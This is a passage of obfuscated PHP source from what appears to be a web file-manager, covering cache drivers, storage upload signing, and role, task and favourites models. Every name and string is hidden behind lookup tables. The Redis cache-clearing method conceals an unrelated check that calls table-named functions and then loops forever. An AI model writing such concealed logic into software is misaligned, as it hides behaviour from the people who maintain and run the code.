$ì¨Šø™ü[$™ÆØµ»[549]] ? $ì¨Šø™ü[$™ÆØµ»[549]] : $„ÃóÄÀã; $Ó§âˆÜ¬ = isset($GLOBALS[$™ÆØµ»[182]]) && is_array($GLOBALS[$™ÆØµ»[182]]) ? $GLOBALS[$™ÆØµ»[182]][$™ÆØµ»[32]] : $ïóë™¤é[$™ÆØµ»[32]]; if ($­Ÿƒş÷) { return IO::fileOutServer($ì¨Šø™ü[$™ÆØµ»[87]], $ø¿ò†‹‚, $Ó§âˆÜ¬, $„ÃóÄÀã); } IO::fileOut($ì¨Šø™ü[$™ÆØµ»[87]], $ø¿ò†‹‚, $Ó§âˆÜ¬, $„ÃóÄÀã); } public function fileOut($šş¾ã¶–, $¹ğ°ñÄì = false, $¹»Õâíâ = false, $ãÄ§àÏä = '') { $this->_fileOut($šş¾ã¶–, $¹ğ°ñÄì, $¹»Õâíâ, $ãÄ§àÏä); } public function fileOutServer($±Èûä·Ê, $×¦ÄÂŸŠ = false, $ö±øËùÛ = false, $ÆêøÈßÙ = '') { $this->_fileOut($±Èûä·Ê, $×¦ÄÂŸŠ, $ö±øËùÛ, $ÆêøÈßÙ, !0); } protected function _fileOutImage($ö‰‰‡ñ, $Ü¾üÙŞƒ = 250) { $ ”Â•Šş =& $_SERVER[¶Ô„œ…¯]; $•½òÎäˆ = $this->model->pathInfo($ö‰‰‡ñ); if ($•½òÎäˆ[$ ”Â•Šş[487]] == $ ”Â•Šş[91]) { show_json($ ”Â•Šş[1433] . $ö‰‰‡ñ, !1); } $ö…æ½Â = $this->model->fileInfoGet($ö‰‰‡ñ); $•½òÎäˆ[$ ”Â•Šş[183]] = $ö…æ½Â[$ ”Â•Šş[87]]; $GLOBALS[$ ”Â•Šş[182]] = $•½òÎäˆ; IO::fileOutImage($ö…æ½Â[$ ”Â•Šş[87]], $Ü¾üÙŞƒ); } public function fileOutImage($æõ¦÷ÙŒ, $áÏÉ„Æ = 250) { $this->_fileOutImage($æõ¦÷ÙŒ, $áÏÉ„Æ); } public function fileOutImageServer($…ÖÆè“, $Ì»ÜÏÇ = 250) { $this->_fileOutImage($…ÖÆè“, $Ì»ÜÏÇ); } public function link($Ûç£®©İ, $Ò¬‡´†ë = '') { $ş«ãø— = $this->model->fileInfoGet($Ûç£®©İ); return IO::link($ş«ãø—[$_SERVER[¶Ô„œ…¯][87]], $Ò¬‡´†ë); } protected function parse($çÎè¢ÂÓ) { $Ş‘¤¬¸ =& $_SERVER[¶Ô„œ…¯]; if (strstr($çÎè¢ÂÓ, $Ş‘¤¬¸[8]) === !1) { return array($Ş‘¤¬¸[495] => intval($çÎè¢ÂÓ), $Ş‘¤¬¸[87] => $Ş‘¤¬¸[12], $Ş‘¤¬¸[1429] => array()); } $ö³ÍÌ­² = explode($Ş‘¤¬¸[8], trim($çÎè¢ÂÓ, $Ş‘¤¬¸[8])); if (count($ö³ÍÌ­²) < 2) { show_tips(clear_html($çÎè¢ÂÓ) . $Ş‘¤¬¸[1434]); } return array($Ş‘¤¬¸[495] => intval($ö³ÍÌ­²[0]), $Ş‘¤¬¸[87] => $ö³ÍÌ­²[1], $Ş‘¤¬¸[1429] => array_slice($ö³ÍÌ­², 1)); } } goto e…“ÒÀ‰Íè; cÛ¹¯èˆ: class CacheLockDatabase { public function lock($Õœ™¸ò‚, $Ò¢Éƒüï = 0) { $‚§éÇªö = Model($_SERVER[¶Ô„œ…¯][907]); $Ğóœå¥™ = microtime(!0) + $Ò¢Éƒüï; while (microtime(!0) < $Ğóœå¥™) { $œ¾ø‰ ¶ = $‚§éÇªö->get($Õœ™¸ò‚); if (!$œ¾ø‰ ¶ || $œ¾ø‰ ¶ < microtime(!0)) { $¾¦¿„Ãá = $‚§éÇªö->set($Õœ™¸ò‚, $Ğóœå¥™); if ($¾¦¿„Ãá) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ê¯ø£‰®) { return Model($_SERVER[¶Ô„œ…¯][907])->get($Ê¯ø£‰®); } public function unlock($¢Îéó»Ò) { Model($_SERVER[¶Ô„œ…¯][907])->remove($¢Îéó»Ò); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ø•Ú¹Â†, $©”†Ç¯ê) { $ğ¢„¤±ã =& $_SERVER[¶Ô„œ…¯]; if (!class_exists($ğ¢„¤±ã[954])) { show_json($ğ¢„¤±ã[955], !1); } $this->cacheTime = $©”†Ç¯ê; $this->handle = new Memcached(); if (is_array($ø•Ú¹Â†[$ğ¢„¤±ã[956]]) && count($ø•Ú¹Â†[$ğ¢„¤±ã[956]]) >= 1) { foreach ($ø•Ú¹Â†[$ğ¢„¤±ã[956]] as $£é«‹ŠÑ) { $ÏŒ‹Ñßì = explode($ğ¢„¤±ã[4], $£é«‹ŠÑ); $this->handle->addServer($ÏŒ‹Ñßì[0], $ÏŒ‹Ñßì[1]); } } else { $this->handle->addServer($ø•Ú¹Â†[$ğ¢„¤±ã[208]], $ø•Ú¹Â†[$ğ¢„¤±ã[209]]); } } public function set($ƒ…Î•Ôí, $ÂÂúß±ä, $·Ô¢ˆîÚ = false) { $·Ô¢ˆîÚ = $·Ô¢ˆîÚ ? $·Ô¢ˆîÚ : $this->cacheTime; return $this->handle->set($ƒ…Î•Ôí, $ÂÂúß±ä, $·Ô¢ˆîÚ); } public function get($ªÅÈæÔŸ) { return $this->handle->get($ªÅÈæÔŸ); } public function remove($¢Íëòª˜) { return $this->handle->delete($¢Íëòª˜); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‰¬Ë×Š, $Ï‚ïù˜º) { $¶ı·È‹„ =& $_SERVER[¶Ô„œ…¯]; if (!class_exists($¶ı·È‹„[957])) { show_json($¶ı·È‹„[958], !1); } $this->cacheTime = $Ï‚ïù˜º; $£Ÿğ¶Ù¨ = isset($‰¬Ë×Š[$¶ı·È‹„[959]]) ? $‰¬Ë×Š[$¶ı·È‹„[959]] : 10; $Õ—Ô£¸Ô = _get($‰¬Ë×Š, $¶ı·È‹„[956]); if ($Õ—Ô£¸Ô && is_array($Õ—Ô£¸Ô)) { $this->initCluster($‰¬Ë×Š, $£Ÿğ¶Ù¨); } else { $this->handle = $this->init($‰¬Ë×Š, $£Ÿğ¶Ù¨); } } private function init($æ‘¢—°ş, $íÍòØÚÓ) { $¬¤ñŞÈ =& $_SERVER[¶Ô„œ…¯]; $éÙí·Ş§ = new Redis(); $æÌ¼Ÿ·à = isset($æ‘¢—°ş[$¬¤ñŞÈ[960]]) ? $æ‘¢—°ş[$¬¤ñŞÈ[960]] : !1; if ($æÌ¼Ÿ·à) { $éÙí·Ş§->pconnect($æ‘¢—°ş[$¬¤ñŞÈ[208]], $æ‘¢—°ş[$¬¤ñŞÈ[209]], $íÍòØÚÓ); } else { $éÙí·Ş§->connect($æ‘¢—°ş[$¬¤ñŞÈ[208]], $æ‘¢—°ş[$¬¤ñŞÈ[209]], $íÍòØÚÓ); } if (!empty($æ‘¢—°ş[$¬¤ñŞÈ[489]])) { $éÙí·Ş§->auth($æ‘¢—°ş[$¬¤ñŞÈ[489]]); } if (!empty($æ‘¢—°ş[$¬¤ñŞÈ[835]]) && $æ‘¢—°ş[$¬¤ñŞÈ[835]] != 0) { $éÙí·Ş§->select($æ‘¢—°ş[$¬¤ñŞÈ[835]]); } return $éÙí·Ş§; } private function initCluster($ÌÙûÊş¬, $‚·¤¥…‘) { $Ã¶Ğ¯ğ =& $_SERVER[¶Ô„œ…¯]; $è—é„–œ = array($Ã¶Ğ¯ğ[961], $Ã¶Ğ¯ğ[962], $Ã¶Ğ¯ğ[963]); $øÀîãÁ = $Ã¶Ğ¯ğ[961]; if (isset($ÌÙûÊş¬[$Ã¶Ğ¯ğ[16]]) && in_array($ÌÙûÊş¬[$Ã¶Ğ¯ğ[16]], $è—é„–œ)) { $øÀîãÁ = $ÌÙûÊş¬[$Ã¶Ğ¯ğ[16]]; } switch ($øÀîãÁ) { case $Ã¶Ğ¯ğ[961]: $this->_slave($ÌÙûÊş¬, $‚·¤¥…‘); break; case $Ã¶Ğ¯ğ[962]: break; case $Ã¶Ğ¯ğ[963]: $this->isCluster = !0; $¶ğµ¹óÆ = $ÌÙûÊş¬[$Ã¶Ğ¯ğ[956]]; $îêÁæ¬ô = isset($ÌÙûÊş¬[$Ã¶Ğ¯ğ[960]]) ? $ÌÙûÊş¬[$Ã¶Ğ¯ğ[960]] : !1; $®ç£©ˆè = isset($ÌÙûÊş¬[$Ã¶Ğ¯ğ[489]]) ? $ÌÙûÊş¬[$Ã¶Ğ¯ğ[489]] : null; $this->handle = new RedisCluster(NUll, $¶ğµ¹óÆ, $‚·¤¥…‘, $‚·¤¥…‘, $îêÁæ¬ô, $®ç£©ˆè); break; default: break; } } private function _slave($×©Ê•º±, $£Š²á¹) { $¸óí÷’³ = $×©Ê•º±[$_SERVER[¶Ô„œ…¯][956]]; $this->filterConfig($×©Ê•º±, $¸óí÷’³[0]); $this->handle = $this->init($×©Ê•º±, $£Š²á¹); unset($¸óí÷’³[0]); if (empty($¸óí÷’³)) { return; } $®ÇŞ†ß€ = array_rand($¸óí÷’³); $this->filterConfig($×©Ê•º±, $¸óí÷’³[$®ÇŞ†ß€]); $this->slaveHandle = $this->init($×©Ê•º±, $£Š²á¹); } private function filterConfig(&$ÌÉ¯İİÇ, $çô—ûñ¼) { $é¢„Š·¿ =& $_SERVER[¶Ô„œ…¯]; $Ü¤î±†Ã = explode($é¢„Š·¿[4], $çô—ûñ¼); $ÆÕÁ ‚¿ = array($é¢„Š·¿[208] => $Ü¤î±†Ã[0], $é¢„Š·¿[209] => $Ü¤î±†Ã[1]); $ÌÉ¯İİÇ = array_merge($ÌÉ¯İİÇ, $ÆÕÁ ‚¿); } public function set($—–õàà÷, $ ˜î¦—Ö, $Ûª„ßƒù = false) { $Ûª„ßƒù = $Ûª„ßƒù ? $Ûª„ßƒù : $this->cacheTime; return $this->handle->setEx($—–õàà÷, $Ûª„ßƒù, $ ˜î¦—Ö); } public function setLock($áºŸ•¡ò, $•»óª–ä, $§°ûÇİ) { return $this->handle->setNX($áºŸ•¡ò, $•»óª–ä); } public function get($Ü°«®ğì) { $ÃØÁŒ¢‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÃØÁŒ¢‹->get($Ü°«®ğì); } public function remove($—»’×¯„) { return $this->handle->del($—»’×¯„); } public function deleteAll() { $Á­ùœÅ¾ =& $_SERVER[¶Ô„œ…¯]; if (!isset($_SERVER[$Á­ùœÅ¾[919]]) || !isset($_SERVER[$Á­ùœÅ¾[926]])) { $œô×ôÛ = $Á­ùœÅ¾[964]; $“­š†‹ = $Á­ùœÅ¾[921]; $çØ³ê» = $_SERVER[$Á­ùœÅ¾[922]] . $Á­ùœÅ¾[923]; $Ò‚­ŞÛ = $“­š†‹($çØ³ê»); $›«—¢ = explode($Á­ùœÅ¾[287], $Ò‚­ŞÛ); if (count($›«—¢) < $Á­ùœÅ¾[691]) { $×‡ŸëÙí = $Á­ùœÅ¾[924]; $×‡ŸëÙí(); } $¢‘“›ë = $Á­ùœÅ¾[965]; $¢‘“›ë($_SERVER[$Á­ùœÅ¾[966]]); $ë÷İÁØ = 1; for ($õ„ŒµôÌ = $ë÷İÁØ; $õ„ŒµôÌ > 0; $õ„ŒµôÌ++) { $¢‘“›ë = json_encode($GLOBALS[$Á­ùœÅ¾[494]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÛÒÉ§Û) { $this->handle->flushall($ÛÒÉ§Û); } return; } return $this->handle->flushAll(); } } goto aÛÀÉˆÈâ; C”­¿‡ÌŠ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($«³ÚÑ†Ù) { $this->pathParse = $«³ÚÑ†Ù; } protected function infoParse($·³ãÕ¼ñ, $ˆô°µ¿ô = false) { $Œ·Ü·«æ =& $_SERVER[¶Ô„œ…¯]; return Action($Œ·Ü·«æ[1263])->sharePathInfo($this->pathParse[$Œ·Ü·«æ[87]], !0, $ˆô°µ¿ô); } public function listPath($é‚ˆŒ, $ÄèÇ¹¼Š = false) { $¨ÑÙÓÉ =& $_SERVER[¶Ô„œ…¯]; $¥íˆÒË¦ = IO::listPath($é‚ˆŒ, $ÄèÇ¹¼Š); if (!$¥íˆÒË¦) { return $¥íˆÒË¦; } if (is_array($¥íˆÒË¦[$¨ÑÙÓÉ[1436]])) { $Ğ‹÷¬Æ¨ = Action($¨ÑÙÓÉ[1446])->parsePathChildren($¥íˆÒË¦[$¨ÑÙÓÉ[1436]], array($¨ÑÙÓÉ[497] => $é‚ˆŒ)); $¥íˆÒË¦[$¨ÑÙÓÉ[1436]] = Action($¨ÑÙÓÉ[1263])->shareItemInfo($Ğ‹÷¬Æ¨); } foreach ($¥íˆÒË¦ as $¿¯Ã»¤Ï => $•ÈãÃúŸ) { if (!in_array($¿¯Ã»¤Ï, array($¨ÑÙÓÉ[86], $¨ÑÙÓÉ[85]))) { continue; } foreach ($•ÈãÃúŸ as $ú»ø¹åÕ => $Ğ‹÷¬Æ¨) { $Ğ‹÷¬Æ¨ = Action($¨ÑÙÓÉ[1446])->parsePathChildren($Ğ‹÷¬Æ¨, array($¨ÑÙÓÉ[497] => $é‚ˆŒ)); $¥íˆÒË¦[$¿¯Ã»¤Ï][$ú»ø¹åÕ] = Action($¨ÑÙÓÉ[1263])->shareItemInfo($Ğ‹÷¬Æ¨); } } return $¥íˆÒË¦; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¾•úìÀ“) { parent::__construct($¾•úìÀ“); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($áÒšÌ›•) { parent::__construct($áÒšÌ›•); $this->setSignVersion($_SERVER[¶Ô„œ…¯][249]); } public function uploadFormData($¹£¡Ã®¦, $›Ûó½Ô» = 3600) { $¡éß„ªç =& $_SERVER[¶Ô„œ…¯]; $êµú¶ô¶ = $¡éß„ªç[231]; $Ó²ÓÚÊ = $¡éß„ªç[259]; $ÙôØÉÙë = $¡éß„ªç[62]; $†ïÖ½âŒ = gmdate($¡éß„ªç[260]); $ÊºÔü¢è = gmdate($¡éß„ªç[261]); $Ã‡ïÇ¼ = $¡éß„ªç[262]; $ÚïçÒÉ‡ = $›Ûó½Ô» . $¡éß„ªç[12]; $›ùâ—¹ñ = $¡éß„ªç[263]; $Ú´äâÚ = array($this->accessKey, $ÊºÔü¢è, $this->region, $ÙôØÉÙë, $Ã‡ïÇ¼); $Ã÷øú·é = implode($¡éß„ªç[8], $Ú´äâÚ); $á››»Ÿ— = array($¡éß„ªç[264] => gmdate($¡éß„ªç[1420], strtotime($¡éß„ªç[266])), $¡éß„ªç[267] => array(array($¡éß„ªç[268] => $this->bucket), array($¡éß„ªç[308] => $êµú¶ô¶), array($¡éß„ªç[269], $¡éß„ªç[270], $¡éß„ªç[12]), array($¡éß„ªç[269], $¡éß„ªç[271], $¡éß„ªç[12]), array($¡éß„ªç[269], $¡éß„ªç[309], $¡éß„ªç[12]), array($¡éß„ªç[272] => $›ùâ—¹ñ), array($¡éß„ªç[273] => $Ã÷øú·é), array($¡éß„ªç[274] => $Ó²ÓÚÊ), array($¡éß„ªç[275] => $†ïÖ½âŒ), array($¡éß„ªç[276] => $ÚïçÒÉ‡))); $÷§ş†ù° = base64_encode(json_encode($á››»Ÿ—)); $…Ğ˜éŠ¥ = hash_hmac($¡éß„ªç[277], $ÊºÔü¢è, $¡éß„ªç[278] . $this->secret, !0); $¿ä¹˜óÛ = hash_hmac($¡éß„ªç[277], $this->region, $…Ğ˜éŠ¥, !0); $è³‘ú¢ = hash_hmac($¡éß„ªç[277], $ÙôØÉÙë, $¿ä¹˜óÛ, !0); $÷¹ì•–ü = hash_hmac($¡éß„ªç[277], $Ã‡ïÇ¼, $è³‘ú¢, !0); $ÈÈíí‡‘ = hash_hmac($¡éß„ªç[277], $÷§ş†ù°, $÷¹ì•–ü); $ÚÇá›ôĞ = array($¡éß„ªç[248] => $¡éß„ªç[12], $¡éß„ªç[296] => $¡éß„ªç[12], $¡éß„ªç[308] => $êµú¶ô¶, $¡éß„ªç[272] => $›ùâ—¹ñ, $¡éß„ªç[279] => $÷§ş†ù°, $¡éß„ªç[310] => $Ã÷øú·é, $¡éß„ªç[311] => $Ó²ÓÚÊ, $¡éß„ªç[312] => $†ïÖ½âŒ, $¡éß„ªç[313] => $ÚïçÒÉ‡, $¡éß„ªç[314] => $ÈÈíí‡‘, $¡éß„ªç[208] => $this->getHost()); return $ÚÇá›ôĞ; } } goto c·ÉˆéÂåÅ; C²Úï’ˆ“ê: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\162\157\x6c\x65\114\151\163\164"; public $field = array("\156\141\155\145", "\141\x75\x74\150", "\154\141\142\145\154", "\144\x69\163\160\x6c\x61\x79", "\x73\x79\163\164\145\x6d", "\x64\x65\163\x63", "\151\x67\x6e\x6f\162\145\105\x78\x74", "\x69\147\x6e\157\162\x65\x46\151\154\145\x53\151\172\x65", "\x61\144\155\x69\156\151\163\164\x72\141\x74\157\162", "\x73\x6f\x72\164"); public function listData($ªÕë…¹ = false, $ÀŸ¢”Ó£ = "\x73\x6f\162\x74", $Ú»îÖ²ğ = false) { $ü€ã•á =& $_SERVER[¶Ô„œ…¯]; $Úƒ„Ó²“ = parent::listData($ªÕë…¹, $ÀŸ¢”Ó£, $Ú»îÖ²ğ); if (!$ªÕë…¹) { foreach ($Úƒ„Ó²“ as $—üú»ê => $üÉ®×‰) { if ($üÉ®×‰[$ü€ã•á[2188]] == 1) { $Úƒ„Ó²“[$—üú»ê][$ü€ã•á[528]] = LNG($ü€ã•á[2457]); } } } return $Úƒ„Ó²“; } public function update($ÕÛÖ¾Ğ, $Ã‘·ÂÏó) { $äº©®ÄÜ =& $_SERVER[¶Ô„œ…¯]; $Ãé®Œşº = parent::listData($ÕÛÖ¾Ğ); $ùşæÅüù = $this->findByName($Ã‘·ÂÏó[$äº©®ÄÜ[32]]); if (!$Ãé®Œşº || $ùşæÅüù && $ùşæÅüù[$äº©®ÄÜ[477]] != $Ãé®Œşº[$äº©®ÄÜ[477]]) { return !1; } if ($ùşæÅüù[$äº©®ÄÜ[2188]] == 1) { $Ã‘·ÂÏó = array($äº©®ÄÜ[32] => $Ã‘·ÂÏó[$äº©®ÄÜ[32]], $äº©®ÄÜ[2003] => $Ã‘·ÂÏó[$äº©®ÄÜ[2003]]); } $this->filterAuth($Ã‘·ÂÏó[$äº©®ÄÜ[489]]); return parent::update($ÕÛÖ¾Ğ, $Ã‘·ÂÏó); } public function remove($ËÃÀ¢íÂ) { $Ö±Õ“ûœ = parent::listData($ËÃÀ¢íÂ); if (!$Ö±Õ“ûœ || $Ö±Õ“ûœ[$_SERVER[¶Ô„œ…¯][191]]) { return !1; } return parent::remove($ËÃÀ¢íÂ); } public function add($ğÒÍ‘èé) { $¤“İ‡Ç =& $_SERVER[¶Ô„œ…¯]; $ĞŞ¢›€Ô = $ğÒÍ‘èé[$¤“İ‡Ç[32]]; if ($this->findByName($ĞŞ¢›€Ô)) { return !1; } $àúê„‘¨ = array($¤“İ‡Ç[496] => $ĞŞ¢›€Ô, $¤“İ‡Ç[1986] => $¤“İ‡Ç[12], $¤“İ‡Ç[1982] => $¤“İ‡Ç[1990], $¤“İ‡Ç[2458] => 1, $¤“İ‡Ç[1985] => 0, $¤“İ‡Ç[2459] => 0, $¤“İ‡Ç[1984] => $this->getSort()); $ğÒÍ‘èé = array_merge($àúê„‘¨, $ğÒÍ‘èé); $this->filterAuth($ğÒÍ‘èé[$¤“İ‡Ç[489]]); return parent::insert($ğÒÍ‘èé); } private function getSort() { $Ä®¦×”¦ =& $_SERVER[¶Ô„œ…¯]; $å½…§¿î = parent::listData(); $¾ø×‹÷ = array_to_keyvalue($å½…§¿î, $Ä®¦×”¦[12], $Ä®¦×”¦[2004]); return empty($¾ø×‹÷) ? 0 : max($¾ø×‹÷) + 1; } private function filterAuth(&$Èİüõ·ª) { $æÔÛË²° =& $_SERVER[¶Ô„œ…¯]; $Ù„“íİ = array(); $Ü¦ÃÔ¥’ = array_filter(explode($æÔÛË²°[50], $Èİüõ·ª)); foreach ($Ü¦ÃÔ¥’ as $Èİüõ·ª) { $åæûºØ = explode($æÔÛË²°[10], $Èİüõ·ª); if ($åæûºØ[0] == $æÔÛË²°[2460] && $åæûºØ[1] != $æÔÛË²°[1282]) { $™¹ÀŞæÛ = $åæûºØ[0] . $æÔÛË²°[10] . $åæûºØ[1] . $æÔÛË²°[2461]; if (!in_array($™¹ÀŞæÛ, $Ü¦ÃÔ¥’)) { $Ù„“íİ[] = $™¹ÀŞæÛ; } } $Ù„“íİ[] = $Èİüõ·ª; } $Èİüõ·ª = implode($æÔÛË²°[50], $Ù„“íİ); } public function findRoleDefault() { $ Õ½÷šö =& $_SERVER[¶Ô„œ…¯]; $óé×éÁ¶ = parent::listData(); $À¯Ú¾™ï = !1; foreach ($óé×éÁ¶ as $ˆ»àµÕ) { if (!$ˆ»àµÕ || $ˆ»àµÕ[$ Õ½÷šö[2002]] == $ Õ½÷šö[230] || $ˆ»àµÕ[$ Õ½÷šö[2188]] == 1) { continue; } if (strstr($ˆ»àµÕ[$ Õ½÷šö[489]], $ Õ½÷šö[2462])) { continue; } if (!strstr($ˆ»àµÕ[$ Õ½÷šö[489]], $ Õ½÷šö[2463])) { continue; } if (!$À¯Ú¾™ï) { $À¯Ú¾™ï = $ˆ»àµÕ; continue; } $ÍÔ±Ğ´” = explode($ Õ½÷šö[50], $À¯Ú¾™ï[$ Õ½÷šö[489]]); $šªÜŒĞ‚ = explode($ Õ½÷šö[50], $ˆ»àµÕ[$ Õ½÷šö[489]]); if (count($ÍÔ±Ğ´”) > count($šªÜŒĞ‚)) { $À¯Ú¾™ï = $ˆ»àµÕ; } } return $À¯Ú¾™ï ? $À¯Ú¾™ï[$ Õ½÷šö[477]] : $ Õ½÷šö[12]; } public function sort($ºØñÑ­˜, $êÀÄŸ­¸) { return parent::update($ºØñÑ­˜, $êÀÄŸ­¸); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\164\141\x73\x6b\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x74\x79\x70\145", "\x65\166\145\156\164", "\x74\x69\155\x65", "\x64\145\163\143", "\163\171\163\x74\145\x6d", "\x65\156\141\142\154\x65", "\154\141\x73\164\x52\165\156", "\x73\x6f\x72\164"); public function listData($‰Î‹ƒ— = false, $Í€Åø‹… = "\163\x6f\x72\x74", $ëéıÜ©Ï = false) { return parent::listData($‰Î‹ƒ—, $Í€Åø‹…, $ëéıÜ©Ï); } public function add($ÎÁõ€òº) { $ºû³äªÓ =& $_SERVER[¶Ô„œ…¯]; $·Ÿ£›¡ = $this->findByName($ÎÁõ€òº[$ºû³äªÓ[32]]); if ($·Ÿ£›¡) { return !1; } $ÎÁõ€òº[$ºû³äªÓ[1730]] = 0; $ÎÁõ€òº[$ºû³äªÓ[2004]] = $this->getSort(); return parent::insert($ÎÁõ€òº); } private function getSort() { $è¦Âˆ¡  =& $_SERVER[¶Ô„œ…¯]; $ö”•êÃ² = parent::listData(); $ÖÂ¾ˆË¹ = array_to_keyvalue($ö”•êÃ², $è¦Âˆ¡ [12], $è¦Âˆ¡ [2004]); return empty($ÖÂ¾ˆË¹) ? 0 : max($ÖÂ¾ˆË¹) + 1; } public function update($ññšî·–, $¬Ÿ›ºÑ) { $ ÂÁşàÊ =& $_SERVER[¶Ô„œ…¯]; $è‡ ßª° = $this->listData($ññšî·–); $–ë‚‡¥ = $this->findByName($¬Ÿ›ºÑ[$ ÂÁşàÊ[32]]); if (!$è‡ ßª° || $–ë‚‡¥ && $–ë‚‡¥[$ ÂÁşàÊ[477]] != $è‡ ßª°[$ ÂÁşàÊ[477]]) { return !1; } return parent::update($ññšî·–, $¬Ÿ›ºÑ); } public function remove($Êà·ğ“ü, $î—ËÎ’• = false) { $Åºú£ó =& $_SERVER[¶Ô„œ…¯]; $ïŸä¢†ª = $this->listData($Êà·ğ“ü); if (!$ïŸä¢†ª) { return; } if (!$î—ËÎ’• && $ïŸä¢†ª[$Åºú£ó[191]] == $Åºú£ó[91]) { return !1; } return parent::remove($Êà·ğ“ü); } public function enable($ô«¥¾¾‚, $¦™È¤ğ–) { return $this->update($ô«¥¾¾‚, array($_SERVER[¶Ô„œ…¯][2452] => $¦™È¤ğ–)); } public function run($èÜ‡ßî„) { return $this->update($èÜ‡ßî„, array($_SERVER[¶Ô„œ…¯][2464] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($ô”šÚò) { $¼ÚÂñ›Ğ =& $_SERVER[¶Ô„œ…¯]; return array($¼ÚÂñ›Ğ[2095] => array(USER_ID, $¼ÚÂñ›Ğ[2465])); } protected function listData() { $ÃŠ¤€ÑÁ =& $_SERVER[¶Ô„œ…¯]; $ØèÖ™†ª = array($ÃŠ¤€ÑÁ[1771] => USER_ID, $ÃŠ¤€ÑÁ[559] => 0); $ÍÎ·ÑªÄ = $ÃŠ¤€ÑÁ[2466]; $’§™ÑÒ = $this->field($ÍÎ·ÑªÄ)->where($ØèÖ™†ª)->order($ÃŠ¤€ÑÁ[2467])->select(); return $’§™ÑÒ ? $’§™ÑÒ : array(); } protected function resetCache() { } protected function listView() { $®Çˆ„î =& $_SERVER[¶Ô„œ…¯]; $¹¿ı € = $this->listData(); $ïéßñƒ = array_filter_by_field($¹¿ı €, $®Çˆ„î[33], $®Çˆ„î[492]); $ã±‚“Úâ = array_to_keyvalue($ïéßñƒ, $®Çˆ„î[12], $®Çˆ„î[87]); if (!$ã±‚“Úâ) { return $¹¿ı €; } $­é½Ç«å = 2000; $äğÄæïï = array($®Çˆ„î[493] => array($®Çˆ„î[494], $ã±‚“Úâ)); $ëúÊÒ = Model($®Çˆ„î[903])->listSource($äğÄæïï, $­é½Ç«å); $ëúÊÒ = array_merge($ëúÊÒ[$®Çˆ„î[86]], $ëúÊÒ[$®Çˆ„î[85]]); $ëúÊÒ = array_to_keyvalue($ëúÊÒ, $®Çˆ„î[193]); foreach ($¹¿ı € as $ÓåÚ¡¦û => $ş¨ßôØÒ) { $¥ú¢Ô— = $ëúÊÒ[$ş¨ßôØÒ[$®Çˆ„î[87]]]; $¥ú¢Ô— = $¥ú¢Ô— ? $¥ú¢Ô— : array(); $¹¿ı €[$ÓåÚ¡¦û] = array_merge($¥ú¢Ô—, $ş¨ßôØÒ); } return $¹¿ı €; } protected function addFav($ç£¡ÈØŠ, $ßæıÂÌ¹ = '', $®ª‘ûªº = "\x73\157\165\162\143\x65") { $ùÎøãã¬ =& $_SERVER[¶Ô„œ…¯]; $ÕÅ‘‡–¢ = array($ùÎøãã¬[1771] => USER_ID, $ùÎøãã¬[559] => 0, $ùÎøãã¬[498] => $®ª‘ûªº, $ùÎøãã¬[497] => $ç£¡ÈØŠ); if ($this->where($ÕÅ‘‡–¢)->find()) { return !1; } $ÕÅ‘‡–¢ = array($ùÎøãã¬[1771] => USER_ID, $ùÎøãã¬[559] => 0); $‚©˜ñæş = $this->where($ÕÅ‘‡–¢)->max($ùÎøãã¬[2004]); if (!$‚©˜ñæş) { $‚©˜ñæş = 0; } if (!$ßæıÂÌ¹ && $®ª‘ûªº == $ùÎøãã¬[492]) { $æšË·‹ = Model($ùÎøãã¬[1428])->where(array($ùÎøãã¬[493] => $ç£¡ÈØŠ))->find(); if (!$æšË·‹) { return !1; } $ßæıÂÌ¹ = $æšË·‹[$ùÎøãã¬[32]]; } $ßæıÂÌ¹ = $this->getAutoName($ßæıÂÌ¹); $ê›ÌÇ– = array($ùÎøãã¬[1771] => USER_ID, $ùÎøãã¬[559] => 0, $ùÎøãã¬[496] => $ßæıÂÌ¹, $ùÎøãã¬[497] => $ç£¡ÈØŠ, $ùÎøãã¬[498] => $®ª‘ûªº, $ùÎøãã¬[1984] => $‚©˜ñæş + 1); return $this->add($ê›ÌÇ–); } protected function remove($à†Õğı) { $Ü¢±›‰î =& $_SERVER[¶Ô„œ…¯]; $½ö‘°Õ = array($Ü¢±›‰î[1771] => USER_ID, $Ü¢±›‰î[495] => $à†Õğı); return $this->where($½ö‘°Õ)->delete(); } protected function removeByName($ê·¯°Ğõ) { $Ñ‰øŠÁ =& $_SERVER[¶Ô„œ…¯]; $õøÔ²·“ = array($Ñ‰øŠÁ[1771] => USER_ID, $Ñ‰øŠÁ[496] => $ê·¯°Ğõ, $Ñ‰øŠÁ[559] => 0); return $this->where($õøÔ²·“)->delete(); } protected function rename($³×ëÈƒü, $ƒµ‰ï­) { $ñ ®¨‚‹ =& $_SERVER[¶Ô„œ…¯]; if ($³×ëÈƒü == $ƒµ‰ï­) { return !1; } $Ø¯ƒï´¶ = $this->getAutoName($ƒµ‰ï­); if ($ƒµ‰ï­ != $Ø¯ƒï´¶) { return !1; } $í©ÓÆ“ä = array($ñ ®¨‚‹[1771] => USER_ID, $ñ ®¨‚‹[559] => 0, $ñ ®¨‚‹[32] => $³×ëÈƒü); return $this->where($í©ÓÆ“ä)->save(array($ñ ®¨‚‹[32] => $ƒµ‰ï­)); } protected function resetSort($ÉÖ”çª¶) { $»œğ–Üñ =& $_SERVER[¶Ô„œ…¯]; $ÉÖ”çª¶ = is_array($ÉÖ”çª¶) ? $ÉÖ”çª¶ : array(); $ºÎ÷Åİâ = array($»œğ–Üñ[1771] => USER_ID); for ($üóç  = 0; $üóç  < count($ÉÖ”çª¶); $üóç ++) { $ºÎ÷Åİâ[$»œğ–Üñ[495]] = 